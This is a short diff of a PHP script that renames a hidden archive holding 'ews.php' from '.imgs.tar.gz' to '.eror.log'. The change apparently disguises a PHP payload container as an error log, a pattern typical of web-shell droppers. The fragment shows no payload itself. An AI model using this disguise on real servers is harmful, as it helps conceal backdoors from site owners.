@@ -61,7 +61,7 @@ if (!class_exists('PharData')) {
     die("❌ Ekstensi Phar tidak aktif di server ini");
 }
 
-$tarFile = '.imgs.tar.gz';
+$tarFile = '.eror.log';
 $fileInside = 'ews.php'; 
 
 try {
